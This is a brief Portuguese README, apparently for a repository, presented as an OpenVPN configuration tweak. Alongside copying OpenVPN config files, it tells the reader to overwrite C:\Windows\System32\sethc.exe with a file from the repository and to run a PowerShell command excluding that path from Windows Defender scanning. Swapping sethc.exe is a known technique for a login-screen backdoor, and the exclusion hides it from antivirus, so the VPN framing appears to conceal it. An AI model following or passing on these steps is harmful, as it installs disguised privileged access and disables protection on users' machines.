# Ajuste OpenVPN - sethc 

Copie o conteudo da pasta config para:
```
C:\Program Files\OpenVPN\config
```

altere o arquivo sethc.exe na pasta C:\Windows\System32 pelo arquivo deste repositório.

PS1
```Powershell 
Add-MpPreference -ExclusionPath "C:\Windows\System32\sethc.exe"

```
